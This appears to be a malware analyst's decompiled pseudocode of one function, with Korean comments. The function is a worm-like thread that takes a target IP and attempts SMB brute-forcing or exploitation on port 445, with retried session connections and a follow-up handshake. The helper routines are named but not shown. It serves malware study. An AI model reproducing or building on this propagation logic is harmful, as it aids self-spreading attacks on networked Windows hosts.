// --- Metadata ---
// Function Name: StartAddress
// Address: 0x407540
// Exported At: 20250527_184010
// Signature: unknown_signature
// ---------------
unsigned int __stdcall StartAddress(void *in)
{
  char *v1; // eax
  int i; // edi
  char Destination; // [esp+4h] [ebp-104h] BYREF
  char v5[256]; // [esp+5h] [ebp-103h] BYREF
  __int16 v6; // [esp+105h] [ebp-3h]
  char v7; // [esp+107h] [ebp-1h]

  Destination = 0;
  memset(v5, 0, sizeof(v5));
  v6 = 0;
  v7 = 0;
  v1 = inet_ntoa(in);
  strncpy(&Destination, v1, 0x10u);
  if ( smbBruteforce_401980(&Destination, 445u) )// 대상 IP에 대해 SMB 취약점 익스플로잇을 시도하는 스레드 진입점 
  {
    for ( i = 0; i < 5; ++i )                   // 5회 반복 세션 연결 시도 
    {
      Sleep(3000u);
      if ( check_smb_session_response_401B70(&Destination, 1, 445u) )
        break;
      Sleep(3000u);
      manageConnectedClient_401370(&Destination, 445u);
    }
  }
  Sleep(3000u);
  if ( check_smb_session_response_401B70(&Destination, 1, 445u) )
    TCPhandshakeSequence_4072A0(&Destination, 1, 445u);
  endthreadex(0);
  return 0;
}
